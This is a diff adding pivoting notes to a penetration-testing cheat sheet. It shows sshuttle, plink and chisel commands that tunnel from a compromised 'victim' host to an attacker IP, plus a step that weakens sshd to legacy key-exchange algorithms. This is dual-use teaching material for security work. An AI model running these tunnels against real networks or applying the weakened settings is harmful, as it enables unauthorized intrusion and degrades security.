@@ -196,7 +196,7 @@ How-To:
     * To fix this: about:config and set the following to FALSE
       * media.peerconnection.established
 
-### SSHuttle
+## SSHuttle
 
 * This is a great tool that can allow you to pivot across networks.
 
@@ -214,4 +214,145 @@ Usage:
 
 ```
 sshuttle -r root@192.168.1.101 192.168.1.0/24
+```
+
+tools.
+
+#### Workflow
+
+Set a VPN through ssh.
+
+Requirements:
+
+* root access to the attacking machine
+* simple user access at the ssh server
+
+The simplest form is to run this from the attacker machine:
+
+```
+sudo sshuttle -vNHr victim_user@victim_host
+```
+
+The above command will create `iptables` `nat` rules to forward all networks that `victim_host` is connected to back to the attacker.
+
+* `-H` automatically updates the local `/etc/hosts` with maching remote hostnames
+* `-N` automatically attempts to route all subnets of the ssh server
+
+Then, the attacker can simply use a tool to connect to the desired host/port inside the _internal_ network, which is normally inacessible, e.g.:
+
+```
+smbclient -L 172.16.45.130
+```
+
+If you went to use a specific ssh command to connect to the remote server, such as specifying your `rsa` private key, you can use the `-e` like so:
+
+```
+sshuttle -e "ssh -i id_rsa" -r victim_user@victim_host 172.168.1.0/24
+```
+
+The above command only routes subnet `172.168.1.0/24` back to the attacker
+
+`sshuttle` actually has a wealth of additional functionalities, you can further refer to its man-page.
+
+## Plink
+
+#### Remote Tunnel
+
+```
+cmd.exe /c echo y | plink.exe -ssh -l [attacker_username] -pw [attacker_ssh_password] -R [attacker_ip]:[attacker_port]:[victim_ip]:[victim_port] [attacker_ip]
+```
+
+for example, suppose you have gained access at a dual-homed host and using this access, you want to access a port at another host that is not connected to the internet (you can't directly talk to it) but is accessible from the host you have access to:
+
+* `attacker_ip` = 13.13.13.13
+* `attacker_port` = 2222 (this is the final port that will accept the remote connection)
+* `victim_ip` = 10.10.10.10 (IP of the inaccessible host)
+* `victim_port` = 22 (Port of the inaccessible host that you will tunnel outside)
+
+`cmd.exe /c echo y | plink.exe -ssh -l root -pw toor -R 13.13.13.13:2222:10.10.10.10:22 13.13.13.13`
+
+#### Local Tunnel
+
+If you don't want to do an SSH remote port forwarding, but a local one instead:
+
+```
+cmd.exe /c echo y | plink.exe -ssh -l root -pw toor -R [attacker_ip]:[attacker_port]:127.0.0.1:[victim_port] [attacker_ip]
+```
+
+The above command will forward the local `victim_port` at the host that you have access to, to your `attacker_ip`:`attacker_port`
+
+In the commands above, the `cmd.exe /c echo y |` part can be ommited if you have previously accepted the server SSH certificate.
+
+For the above to work, you need the following configuration at your SSH server: `GatewayPorts yes`
+
+#### Plink Troubleshooting
+
+* Check if architecture of plink and target system are compitable (32 bit & 64 bit).
+* Check the version of plink, find newest version [here](https://www.putty.org/)
+*   Key exchange algorithm troubleshooting:
+
+    * FATAL ERROR: Couldn't agree a key exchange algorithm (available: curve25519-sha256,[curve25519-sha256@libssh.org](mailto:curve25519-sha256@libssh.org),ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256).
+    * Solution: Try to edit **/etc/ssh/sshd\_config** and put the following to the top of the file:
+
+    ```
+     KexAlgorithms +diffie-hellman-group1-sha1
+     Ciphers +aes128-cbc
+    ```
+
+    Stop ssh from attackers machine:
+
+    ```
+     systemctl stop ssh
+    ```
+
+    Regenerate the keys:
+
+    ```
+     ssh-keygen -A
+    ```
+
+    Start ssh again:
+
+    ```
+     systemctl start ssh
+    ```
+
+    Use again the plink (Victim machine)
+
+## Chisel
+
+#### Chisel Tunneling
+
+You need to use the **same version for client and server** of chisel.
+
+Server side (Attacker):
+
+```
+chisel server -p 8080 --reverse
+```
+
+Client Side (Victim):
+
+```
+chisel-x64.exe client [my_ip]:8080 R:socks 
+```
+
+After that use **proxychains** with port 1080 (default).
+
+After version 1.5.0 chisel uses socks5 proxy.
+
+#### Chisel Port Forwarding
+
+You need to use the **same version for client and server** of chisel.
+
+Server side (Attacker):
+
+```
+chisel server -p 12312 --reverse
+```
+
+Client Side (Victim):
+
+```
+chisel client [my_ip]:12312 R:[port]:127.0.0.1:[port]
 ```
